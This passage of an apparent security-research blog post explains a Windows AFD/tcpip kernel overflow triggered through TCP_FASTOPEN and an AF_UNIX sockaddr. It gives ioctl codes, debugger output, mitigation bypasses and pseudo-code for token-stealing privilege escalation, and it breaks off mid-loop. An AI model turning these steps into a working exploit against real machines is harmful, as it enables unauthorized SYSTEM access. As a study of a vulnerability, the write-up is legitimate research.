&lt;p>In this case &amp;ldquo;mswsock.dll&amp;rdquo; tries to open a &lt;code>HANDLE&lt;/code> to AFD or the &amp;ldquo;Ancillary Function Driver for WinSock&amp;rdquo;.&lt;/p>
&lt;h2 id="afd">AFD&lt;/h2>
&lt;p>AFD is located at &amp;ldquo;C:\windows\system32\drivers\afd.sys&amp;rdquo; and provides implementations for the usual socket functions.&lt;/p>
&lt;p>As I have hopefully been able to convince you the &lt;code>socket&lt;/code> function corresponds to opening a &lt;code>HANDLE&lt;/code> to AFD using &lt;code>NtCreateFile&lt;/code>.
Using the &lt;code>HANDLE&lt;/code> returned by &lt;code>NtCreateFile&lt;/code>, communication occurs via the &lt;code>NtDeviceIoControlFile&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">__kernel_entry NTSTATUS &lt;span style="color:#a6e22e">NtDeviceIoControlFile&lt;/span>(
[in] HANDLE FileHandle,
[in] HANDLE Event,
[in] PIO_APC_ROUTINE ApcRoutine,
[in] PVOID ApcContext,
[out] PIO_STATUS_BLOCK IoStatusBlock,
[in] ULONG IoControlCode,
[in] PVOID InputBuffer,
[in] ULONG InputBufferLength,
[out] PVOID OutputBuffer,
[in] ULONG OutputBufferLength
);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, each different socket function corresponds to an &lt;code>IoControlCode&lt;/code> or ioctl for short.
For example, if we &lt;code>bind&lt;/code> the socket we end up in &lt;code>afd!AfdBind&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>00 afd!AfdBind
01 afd!AfdDispatchDeviceControl+0x7d
02 nt!IofCallDriver+0x59
03 nt!IopSynchronousServiceTail+0x1b1
04 nt!IopXxxControlFile+0xe0c
05 nt!NtDeviceIoControlFile+0x56
06 nt!KiSystemServiceCopyEnd+0x25
07 ntdll!NtDeviceIoControlFile+0x14
08 mswsock!WSPBind+0x278
09 WS2_32!bind+0xdf
0a blog_socket!main+0x137
&lt;/code>&lt;/pre>&lt;p>Similarly, &lt;code>recv&lt;/code> corresponds to &lt;code>AfdReceive&lt;/code>, &lt;code>send&lt;/code> corresponds to &lt;code>AfdSend&lt;/code> and so on.
The arguments and return values of these functions are serialized into the &lt;code>InputBuffer&lt;/code> and &lt;code>OutputBuffer&lt;/code>, respectively.&lt;/p>
&lt;h2 id="the-bug">The Bug&lt;/h2>
&lt;p>The bug combines three different features that Windows 10 provides. The &lt;code>TCP_FASTOPEN&lt;/code> option, the &lt;code>ConnectEx&lt;/code>/&lt;code>AfdSuperConnect&lt;/code> function and the &lt;code>AF_UNIX&lt;/code> address family.&lt;/p>
&lt;h3 id="tcp_fastopen">TCP_FASTOPEN&lt;/h3>
&lt;p>Taken from &lt;a href="https://en.wikipedia.org/wiki/TCP_Fast_Open">Wikipedia&lt;/a>, the &lt;code>TCP_FASTOPEN&lt;/code> option allows the client under certain conditions to start sending data to the host without waiting for the &lt;code>ACK&lt;/code> packet. For us, what it does is not important, only that it is necessary to call &lt;code>AfdSuperConnect&lt;/code> later on.&lt;/p>
&lt;h3 id="af_unix">AF_UNIX&lt;/h3>
&lt;p>As mentioned by this blog, the vulnerability probably turned exploitable when Windows &lt;a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">started supporting&lt;/a> sockets of type &lt;code>AF_UNIX&lt;/code>.
&lt;code>AF_UNIX&lt;/code> sockets provide a means of inter-process communication. For us the important fact is that the associated &lt;code>sockaddr&lt;/code> looks like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#define UNIX_PATH_MAX 108
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> sockaddr_un
{
ADDRESS_FAMILY sun_family; &lt;span style="color:#75715e">/* AF_UNIX */&lt;/span>
&lt;span style="color:#66d9ef">char&lt;/span> sun_path[UNIX_PATH_MAX]; &lt;span style="color:#75715e">/* pathname */&lt;/span>
} SOCKADDR_UN, &lt;span style="color:#f92672">*&lt;/span>PSOCKADDR_UN;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And therefore, with a size of &lt;code>110 = 0x6e&lt;/code> is quite large.&lt;/p>
&lt;h3 id="connectex">ConnectEx&lt;/h3>
&lt;p>The &lt;code>ConnectEx&lt;/code> function is a &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/mswsock/nc-mswsock-lpfn_connectex">Microsoft specific extension&lt;/a>, which can be queried using &lt;code>WSAIoctl&lt;/code>.
The underlying kernel function is &lt;code>AfdSuperConnect&lt;/code>.
Sadly, the user space API validates the arguments to &lt;code>ConnectEx&lt;/code> and therefore we are forced to call it using &lt;code>NtDeviceIoControlFile&lt;/code> directly.
The socket functions do not expose the underlying handles to AFD. This forces us to use &lt;code>NtCreateFile&lt;/code> and &lt;code>NtDeviceIoControlFile&lt;/code> directly for all communication with AFD.&lt;/p>
&lt;p>&lt;code>AfdSuperConnect&lt;/code> gets invoked when using &lt;code>NtDeviceIoControlFile&lt;/code> with the ioctl &lt;code>0x120c7&lt;/code>.
The input buffer for this call consists of 10 bytes, most of which seem to be unused and then any &lt;code>sockaddr&lt;/code>.
The vulnerability occurs when &lt;code>AfdSuperConnect&lt;/code> attempts to connect to a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_UNIX&lt;/code>.&lt;/p>
&lt;h3 id="the-setup">The Setup&lt;/h3>
&lt;ol>
&lt;li>Create an &lt;code>AF_INET&lt;/code> socket using &lt;code>NtCreateFile&lt;/code>.&lt;/li>
&lt;li>Enable the &lt;code>TCP_FASTOPEN&lt;/code> option using &lt;code>AfdTliIoControl&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x120bf&lt;/code>).&lt;/li>
&lt;li>Bind the socket to any address using ioctl &lt;code>AfdBind&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x12003&lt;/code>).&lt;/li>
&lt;li>Trigger the vulnerability by using &lt;code>AfdSuperConnect&lt;/code> (&lt;code>NtDeviceIoControlFile&lt;/code> with ioctl &lt;code>0x120c7&lt;/code>) passing a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_UNIX&lt;/code>.&lt;/li>
&lt;/ol>
&lt;p>As we opened the socket as an &lt;code>AF_INET&lt;/code> socket, the call to &lt;code>AfdSuperConnect&lt;/code> ends up in &lt;code>tcpip!TcpTlProviderConnectAndSend&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>00 tcpip!TcpTlProviderConnectAndSend
01 afd!AfdSuperConnect+0x10b26
02 afd!AfdDispatchDeviceControl+0x7d
03 nt!IofCallDriver+0x59
04 nt!IopSynchronousServiceTail+0x1b1
05 nt!IopXxxControlFile+0xe0c
06 nt!NtDeviceIoControlFile+0x56
&lt;/code>&lt;/pre>&lt;p>&lt;code>tcpip!TcpCreateConnectTcb&lt;/code> checks early on whether the &lt;code>TCP_FASTOPEN&lt;/code> option is enabled and if it is not it returns with the error code &lt;code>STATUS_RETRY&lt;/code>.
If it is, it allocates a big internal structure and later on copies the &lt;code>sockaddr&lt;/code> we provided into the internal structure.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Ghidra Decompilation from (tcpip!TcpCreateConnectTcb)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
SockaddrFamily &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr;
&lt;span style="color:#66d9ef">if&lt;/span> (SockaddrFamily &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x23&lt;/span>) {
sockaddr_size &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">&amp;amp;::&lt;/span>sockaddr_size)[SockaddrFamily];
}
&lt;span style="color:#75715e">/* this is where the magic happens */&lt;/span>
memcpy(&lt;span style="color:#f92672">&amp;amp;&lt;/span>_Dst&lt;span style="color:#f92672">-&amp;gt;&lt;/span>contains_the_function_pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>sockaddr,
TlConnect&lt;span style="color:#f92672">-&amp;gt;&lt;/span>ConnectSockaddr, sockaddr_size);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Crucially, as this is all happening in &amp;ldquo;tcpip.sys&amp;rdquo;, the code only expects a &lt;code>sockaddr&lt;/code> of type &lt;code>AF_INET&lt;/code> or &lt;code>AF_INET6&lt;/code> which are of size &lt;code>0x1c&lt;/code> and &lt;code>0x24&lt;/code>, respectively.
Hence, tcpip only reserves &lt;code>0x24&lt;/code> bytes of memory for said &lt;code>sockaddr&lt;/code> and we can overwrite &lt;code>0x6e - 0x24&lt;/code> bytes after the size reserved for the &lt;code>sockaddr&lt;/code>.
Fortunately for us, this range of bytes contains a callback function pointer (originally pointing to &lt;code>afd!AfdTLBufferedSendComplete&lt;/code>) and its callback context argument.&lt;/p>
&lt;p>Prior to the vulnerable &lt;code>memcpy&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dq rax + f8 L2
ffffac8e`6702a138 fffff806`2d0db540 ffffac8e`6841c9e0
kd&amp;gt; ln fffff806`2d0db540
(fffff806`2d0db540) afd!AfdTLBufferedSendComplete
&lt;/code>&lt;/pre>&lt;p>After the vulnerable &lt;code>memcpy&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dq ffffac8e`6702a138 L2
ffffac8e`6702a138 13371337`13371337 deaddead`deaddead
&lt;/code>&lt;/pre>&lt;p>The call to &lt;code>tcpip!TcpTlProviderConnectAndSend&lt;/code> eventually fails, returning a status code of &lt;code>STATUS_INVALID_ADDRESS_COMPONENT&lt;/code>,
but not before trying to &amp;ldquo;complete&amp;rdquo; the request, by calling the callback function pointer, passing its callback context as the first argument.&lt;/p>
&lt;pre tabindex="0">&lt;code>Breakpoint 3 hit
tcpip!guard_dispatch_icall_nop:
fffff803`11e36490 ffe0 jmp rax
kd&amp;gt; r rax, rcx
rax=1337133713371337 rcx=deaddeaddeaddead
kd&amp;gt; k
# Child-SP RetAddr Call Site
00 ffffeb0f`32dc18e8 fffff803`11d767fd tcpip!guard_dispatch_icall_nop
01 ffffeb0f`32dc18f0 fffff803`11d73840 tcpip!TcpCreateAndConnectTcbComplete+0xc39
02 ffffeb0f`32dc1b30 fffff803`11d88e2a tcpip!TcpShutdownTcb+0x1040
03 ffffeb0f`32dc1f20 fffff803`11d88d38 tcpip!TcpCreateAndConnectTcbInspectConnectComplete+0xba
04 ffffeb0f`32dc2000 fffff803`11d87be8 tcpip!TcpContinueCreateAndConnect+0x1044
05 ffffeb0f`32dc2220 fffff803`11d87998 tcpip!TcpCreateAndConnectTcbInspectConnectRequestComplete+0x118
06 ffffeb0f`32dc2330 fffff803`11d8709d tcpip!TcpCreateAndConnectTcbWorkQueueRoutine+0x8a8
07 ffffeb0f`32dc2450 fffff803`11ea2247 tcpip!TcpCreateAndConnectTcb+0xcb5
08 ffffeb0f`32dc25d0 fffff803`11995606 tcpip!TcpTlProviderConnectAndSend+0x17
09 ffffeb0f`32dc2600 fffff803`1198958d afd!AfdSuperConnect+0x10b26
&lt;/code>&lt;/pre>&lt;h2 id="exploitability-mitigations-and-complications">Exploitability, Mitigations and Complications&lt;/h2>
&lt;p>As we have seen, the vulnerability gives us full control of the instruction pointer &lt;code>rip&lt;/code> and the first argument &lt;code>rcx&lt;/code>, and does so by calling into a function pointer we can freely choose.
A vulnerability this good is almost always exploitable. But we first have to jump through some loops&amp;hellip;&lt;/p>
&lt;h3 id="smep-supervisor-mode-execution-prevention">SMEP (Supervisor Mode Execution Prevention)&lt;/h3>
&lt;p>The simplest idea to exploit a bug of this kind would be to set the instruction pointer to a user space address,
i.e write some shellcode that when executed in kernel mode will elevate permissions of the current process.
Sadly, Intel thought of this long ago and introduced SMEP.
SMEP uses the fact that user-pages have the &lt;code>USER&lt;/code> flag set in the page tables to throw an exception
when the kernel executes any user address.&lt;/p>
&lt;h3 id="aslr-address-space-layout-randomization">ASLR (Address Space Layout Randomization)&lt;/h3>
&lt;p>Okay, so just executing user space code is out of the question, but what if we first load our shellcode into the kernel? First of, though it sounds hard,
it is actually really easy to allocate arbitrary rwx-memory into kernel space using pipes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">char&lt;/span> rwx_memory [&lt;span style="color:#ae81ff">0x100&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> { &lt;span style="color:#f92672">&amp;lt;&lt;/span>my_shellcode&lt;span style="color:#f92672">&amp;gt;&lt;/span> }; &lt;span style="color:#75715e">// cannot contain zeroes
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
HANDLE read_pipe;
HANDLE write_pipe;
CreatePipe (&lt;span style="color:#f92672">&amp;amp;&lt;/span>read_pipe, &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_pipe, NULL, NULL);
&lt;span style="color:#75715e">// ends up in &amp;#39;NpSetAttribute&amp;#39;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtFsControlFile(write_pipe, NULL, NULL, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>status, &lt;span style="color:#ae81ff">0x11003C&lt;/span>,
rwx_memory, &lt;span style="color:#66d9ef">sizeof&lt;/span>(rwx_memory), output, &lt;span style="color:#66d9ef">sizeof&lt;/span>(output));
&lt;/code>&lt;/pre>&lt;/div>&lt;p>But as far as I know, there is no way for us to know where this allocation will end up (without another exploit or administrator privileges which would defeat the purpose).
Even if we could control the heap perfectly we do not know where the heap starts.
This is because of ASLR (Address Space Layout Randomization). At system startup, Windows randomizes all addresses it will use during runtime.&lt;/p>
&lt;p>So&amp;hellip;? Can we somehow get or leak addresses (or pointers) from the kernel? Fortunately, Windows is very nice to us in this respect.
There is a user space function called &lt;code>NtQuerySystemInformation&lt;/code>, which can be used to retrieve a lot of different kinds of information depending on an &lt;code>InformationClass&lt;/code>.
The &lt;code>InformationClass&lt;/code> we are interested in is &lt;code>SystemModuleInformation&lt;/code>. Using it, we can obtain the loaded base address of every currently running driver on the system,
including the kernel (ntoskrnl.exe) itself.&lt;/p>
&lt;p>By parsing the images contained on disk and using these base addresses, we know the address of every exported kernel function.
One could go one step further and look at all symbols using the public symbols (.pdb) provided by Microsoft,
but for our purposes restricting the search to exported functions was enough.&lt;/p>
&lt;h3 id="cfg-control-flow-guards">CFG (Control Flow Guards)&lt;/h3>
&lt;p>Okay, the plan is to call exported kernel functions, but there (potentially) is one more obstacle in our way the CFG (Control Flow Guard) mitigation.
I did not emphasize this above, but looking at the call stack to the vulnerable call we can see that we are inside of a function called &lt;code>guard_dispatch_icall_nop&lt;/code>.
This means that control flow guards are disabled. If they were enabled we would instead be inside &lt;code>nt!guard_dispatch_icall&lt;/code>.
&lt;code>nt!guard_dispatch_icall&lt;/code> checks whether the address we are jumping to is registered as a CFG target. If the target is not registered, &lt;code>nt!guard_dispatch_icall&lt;/code> crashes the system (mitigating the exploit).
This registration happens when the driver is loaded. The binary contains information on which functions are valid CFG targets.&lt;/p>
&lt;p>You can also view the CFG information using dumpbin:&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;gt; dumpbin /loadconfig C:\windows\system32\ntoskrnl.exe
Microsoft (R) COFF/PE Dumper Version 14.28.29336.0
Copyright (C) Microsoft Corporation. All rights reserved.
Dump of file C:\windows\system32\ntoskrnl.exe
File Type: EXECUTABLE IMAGE
Section contains the following load config:
&amp;lt;...&amp;gt;
Guard CF Function Table
Address
--------
0000000140200010
E 0000000140200050
00000001402000B0
00000001402001A0
E 0000000140200580
E 0000000140200940
E 00000001402009F0
0000000140200C40
00000001402010B0
00000001402010E0
0000000140201200
E 0000000140201750
E 0000000140201770
.
.
.
&lt;/code>&lt;/pre>&lt;p>Therefore, if the exploit is supposed to work even if CFG is enabled, we need to chose our target function as a valid CFG target.&lt;/p>
&lt;h3 id="irql-interrupt-request-level">IRQL (Interrupt Request Level)&lt;/h3>
&lt;p>One last detail that bears mentioning, is the Interrupt Request Level (IRQL). The interrupt Request level is a hardware feature that allows threads to specify what interrupts they are willing to accept.
Importantly, if the IRQL is at &amp;gt;= 2 the thread is not allowed to page-fault anymore. This means that when the IRQL is at least two, the thread cannot access pageable memory anymore.&lt;/p>
&lt;p>Pageable memory is memory that the Windows kernel reserves the right to spill to disk, if the system is running low on memory. If a thread would then access that memory a pagefault would occur and the Windows kernel
would reload the page from disk.&lt;/p>
&lt;p>Why is all this important? Well, it just so happens that the function we are overwriting is a &amp;ldquo;Completion Routine&amp;rdquo;.
Completion Routines are supposed to run at IRQL = 2 and therefore might crash the system whenever they are accessing paged memory.
All user space memory is paged and thus the exploit might crash when accessing user space memory.
Further, not all kernel space functions are non-paged (though most are), further restricting the set of functions we can use in the exploit.&lt;/p>
&lt;p>In reality, we are only interested in providing a proof of concept, so one could just ignore the the fact that the exploit crashes sometimes, but we actually have a solution:&lt;/p>
&lt;p>Sometimes, when the kernel uses a piece of user space memory, it uses so called &lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls">Memory Descriptor Lists (MDL)&lt;/a>. When such a list is &amp;ldquo;locked&amp;rdquo;, the kernel will never page out the memory.
Therefore, we just have to make some request, that will &amp;ldquo;lock&amp;rdquo; an MDL for the user space memory we are using and then we can reliably use it at IRQL = 2.&lt;/p>
&lt;h2 id="primitives">Primitives&lt;/h2>
&lt;p>So, we have control over &lt;code>rip&lt;/code> and &lt;code>rcx&lt;/code> and can call some exported kernel functions, but what is the plan?
Roughly, we want to obtain exploit primitives which allow us to read and write kernel memory:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 kernel_address);
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 kernel_address, u64 value);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>These will later be used to give our process administrator privileges using a generalized exploit algorithm.&lt;/p>
&lt;p>We construct these primitives by using the vulnerability with an exported kernel function.
The perfect kernel function for a read primitive would look something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> read_argument &lt;span style="color:#f92672">*&lt;/span>read){
read&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> read&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And the perfect write function would look something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> write_argument &lt;span style="color:#f92672">*&lt;/span>write){
&lt;span style="color:#f92672">*&lt;/span>write&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pointer &lt;span style="color:#f92672">=&lt;/span> write&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here the read/write argument would be a pointer to user space memory. This means we have full control of the value of &lt;code>read-&amp;gt;pointer&lt;/code> and &lt;code>write-&amp;gt;pointer&lt;/code>, respectively.
These pointers then get dereferenced and either written to the controlled &lt;code>write-&amp;gt;value&lt;/code> or read and stored back into user space memory.&lt;/p>
&lt;p>If one cannot find primitives as perfect as these, one can search for functions that &lt;em>spread&lt;/em> the first argument.
The perfect spread function would be something like:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">spread_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> arguments &lt;span style="color:#f92672">*&lt;/span>arguments){
(&lt;span style="color:#f92672">*&lt;/span>arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>function)(arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_1, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_2,
arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_3, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_4);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using the perfect spread function one could obtain a read/write function as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_write_function_called_by_spread_function&lt;/span>(
&lt;span style="color:#66d9ef">struct&lt;/span> argument_1 &lt;span style="color:#f92672">*&lt;/span>arg_1, &lt;span style="color:#66d9ef">struct&lt;/span> argument_2 &lt;span style="color:#f92672">*&lt;/span>arg_2){
arg_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> arg_2&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In practice, we used two spread functions and then different read and write functions.&lt;/p>
&lt;h2 id="windows-exploitation-tricks-and-the-general-exploit-algorithm">Windows Exploitation tricks and the general exploit algorithm&lt;/h2>
&lt;p>The exploitation algorithm we are using is called &amp;ldquo;Token Stealing&amp;rdquo;. You can find a lot of information on it online. But we will give a short overview.&lt;/p>
&lt;p>Every process has an internal &lt;code>_EPROCESS&lt;/code> kernel structure. The access rights of the process are contained in an internal kernel structure called &lt;code>_TOKEN&lt;/code>.
The &lt;code>_EPROCESS&lt;/code> structure references this token, by pointer.&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dt nt!_EPROCESS Token
+0x358 Token : _EX_FAST_REF
kd&amp;gt; nt!_EX_FAST_REF
+0x000 Object : Ptr64 Void
+0x000 RefCnt : Pos 0, 4 Bits
+0x000 Value : Uint8B
&lt;/code>&lt;/pre>&lt;p>Now, if we control the &lt;code>_TOKEN&lt;/code>, we have control of all access rights.
One option would be to use the read and write primitive to directly alter the access token, but in this case there is a simpler way.
If we can locate a process which has &lt;code>SYSTEM&lt;/code> access rights, we can simply copy the &lt;code>_TOKEN&lt;/code>-pointer of the &lt;code>SYSTEM&lt;/code> process into the &lt;code>_EPROCESS-&amp;gt;Token&lt;/code> of our process.
And it just so happens that the kernel exports a pointer to the &lt;code>nt!PsInitialSystemProcess&lt;/code> which has &lt;code>SYSTEM&lt;/code> access rights.&lt;/p>
&lt;p>Therefore, the basic algorithm would be&lt;/p>
&lt;ol>
&lt;li>Use the read primitive to read the value of &lt;code>(nt!PsInitialSystemProcess)-&amp;gt;Token&lt;/code>&lt;/li>
&lt;li>Use the write primitive to write the value to our &lt;code>_EPROCESS-&amp;gt;Token&lt;/code> field.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://lolcads.github.io/2022/06/token_stealing.svg" alt="Token Stealing">&lt;/p>
&lt;p>But 2 problems remain:&lt;/p>
&lt;ol>
&lt;li>As the &lt;code>_EPROCESS&lt;/code> structure is undocumented and subject to change, the offset of the &lt;code>Token&lt;/code> field varies by kernel version.&lt;/li>
&lt;li>We do not know where our &lt;code>_EPROCESS&lt;/code> structure is.&lt;/li>
&lt;/ol>
&lt;p>This is where Windows is really helpful again. Just as we can find all base addresses of kernel modules using &lt;code>NtQuerySystemInformation(SystemModuleInformation)&lt;/code>,
we can find the address of both our &lt;code>_EPROCESS&lt;/code> structure (solving 2) and our &lt;code>_TOKEN&lt;/code> structure using &lt;code>NtQuerySystemInformation(SystemHandleInformation)&lt;/code>.
Now, using the read primitive, we can iterate through our &lt;code>_EPROCESS&lt;/code> structure and locate the &lt;code>_TOKEN&lt;/code> structure.
This then gives us the offset of the &lt;code>Token&lt;/code> field.&lt;/p>
&lt;p>Putting it all together in pseudo-code, it looks something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Use the Windows API to get all the information we want.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>token, process :&lt;span style="color:#f92672">=&lt;/span> find_token_and_process_using_NtQuerySystemInformation();
PsInitialSystemProcess_export, read_function, write_function :&lt;span style="color:#f92672">=&lt;/span>
find_exported_symbols_using_NtQuerySystemInformation();
&lt;span style="color:#75715e">// Use a system call that is more or less equivalent to
&lt;/span>&lt;span style="color:#75715e">// `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>socket_handle :&lt;span style="color:#f92672">=&lt;/span> NtCreateFile(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Device&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Afd&amp;#34;&lt;/span>, EaBuffer &lt;span style="color:#f92672">=&lt;/span> {AF_INET, SOCK_STREAM, IPPROTO_TCP});
&lt;span style="color:#75715e">// use the system call that is equivalent to
&lt;/span>&lt;span style="color:#75715e">// `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120bf&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {SetSockOpt, .level &lt;span style="color:#f92672">=&lt;/span> IPPROTO_TCP, .option &lt;span style="color:#f92672">=&lt;/span> TCP_FASTOPEN, .optval &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>(u32){&lt;span style="color:#ae81ff">1&lt;/span>}, .optlen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>});
&lt;span style="color:#75715e">// use the system call that is equivalent to
&lt;/span>&lt;span style="color:#75715e">// `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x12003&lt;/span>, ...);
&lt;span style="color:#75715e">// The read and write primitives now work by triggering the vulnerability by calling
&lt;/span>&lt;span style="color:#75715e">// `AfdSuperConnect` through the `NtDeviceIoControlFile`.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>function u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 address)&lt;span style="color:#f92672">:&lt;/span>
read_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address};
NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> read_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>read_argument}});
&lt;span style="color:#66d9ef">return&lt;/span> read_argument.value;
function &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 address, u64 value)&lt;span style="color:#f92672">:&lt;/span>
write_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address, .value &lt;span style="color:#f92672">=&lt;/span> value};
NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> write_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_argument}});
&lt;span style="color:#75715e">// figure out the token_offset, by linearly scanning through our `_EPROCESS`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">for&lt;/span> i from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
